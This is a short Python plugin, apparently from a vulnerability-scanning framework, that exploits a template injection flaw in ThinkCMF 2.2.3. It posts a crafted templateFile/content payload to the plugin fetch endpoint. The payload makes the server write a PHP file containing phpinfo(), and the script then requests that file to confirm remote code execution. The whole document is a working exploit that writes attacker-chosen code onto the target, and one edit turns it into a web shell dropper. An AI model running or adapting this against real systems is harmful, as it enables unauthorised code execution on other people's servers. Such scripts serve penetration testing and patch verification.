#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):
    """
    thinkcmf 2.2.3 template injec
    """

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                for path in self.get_url_normpath_list(self.url):
                    url = path + "index.php?g=Api&m=Plugin&a=fetch"
                    _data = "templateFile=/../../../public/index&prefix=''&content=<php>file_put_contents('bytestforme2.php','<?php phpinfo();')</php>"
                    async with session.post(url=url, data=_data) as res:
                        if res and res.status == 200:
                            async with session.get(url=path + "/bytestforme2.php") as res:
                                if res and res.status == 200:
                                    text = await res.text()
                                    if 'php.ini' in text:
                                        yield url
                                        return